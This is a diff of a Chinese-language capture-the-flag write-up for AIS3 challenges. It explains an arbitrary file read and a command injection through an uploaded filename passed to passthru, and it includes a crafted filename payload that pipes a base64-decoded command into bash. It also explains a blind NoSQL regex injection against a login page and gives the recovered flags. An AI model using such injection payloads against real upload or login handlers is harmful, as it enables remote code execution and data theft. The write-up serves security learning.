@@ -48,6 +48,7 @@ echo(`/rUn_M3_t0_9et_fL4g`);
 
 ### Tari Tari
 1. 上傳 `trash.txt` 後，網頁提供的下載網址為 `http://chals1.ais3.org:9453/download.php?file=MjY1MDEwZmI2MDg2NGU1MGFjZTg5Y2RkYjE4ZmQxZjIudGFyLmd6&name=trash.txt.tar.gz`。把 `file` base64 decode 得到 `265010fb60864e50ace89cddb18fd1f2.tar.gz`，由此猜測 `file` 可以讀取任意檔案。
+
 2. 讀取 `index.php`，發現其使用 `passthru` 執行 shell command，而 `$filename` 為使用者可控，因此可以 RCE。
 ```php
 $filename = $file['name'];
@@ -56,6 +57,7 @@ $source = substr($file['tmp_name'], 1);
 $destination = "./files/$path";
 passthru("tar czf '$destination' --transform='s|$source|$filename|' --directory='/tmp' '/$source'", $return);
 ```
+
 3. 上傳檔案即可讀到 flag。
 ```bash
 $ echo abc >  "'|| echo $(echo -n cat /y000000_i_am_the_f14GGG.txt | base64) | base64 -d | bash;#"
@@ -68,6 +70,15 @@ total 32K
 
 ### The Best Login UI
 
+1. `bodyParser.urlencoded` 中設定 `extended = true`，表示 [HTTP 傳入的參數會被當作 object](https://www.npmjs.com/package/body-parser#extended)，而非 string。再加上使用 MongoDB，因此可以嘗試 NoSQL injection。
+<img width="556" alt="the-best-login-ui-extended" src="https://user-images.githubusercontent.com/38059464/176656006-0c26cfd0-bfbc-4bda-8651-2e4b81e21344.png">
+
+2. 確認可以做 NoSQL injection ([MongoDB query syntax](https://www.mongodb.com/docs/manual/reference/operator/query/))。
+<img width="654" alt="the-best-login-ui-nosql-injection" src="https://user-images.githubusercontent.com/38059464/176657306-5a465ed2-8004-480b-8546-3b3c0a6f68eb.png">
+
+3. 使用 [`$regex`](https://www.mongodb.com/docs/manual/reference/operator/query/regex/#mongodb-query-op.-regex) 把 flag 爆出來，當時寫的 script 超醜就不貼了...。
+
+**Flag: `AIS3{Bl1nd-b4s3d r3gex n0sq1i?! (:3[___]}`**
 
 
 ## Reverse
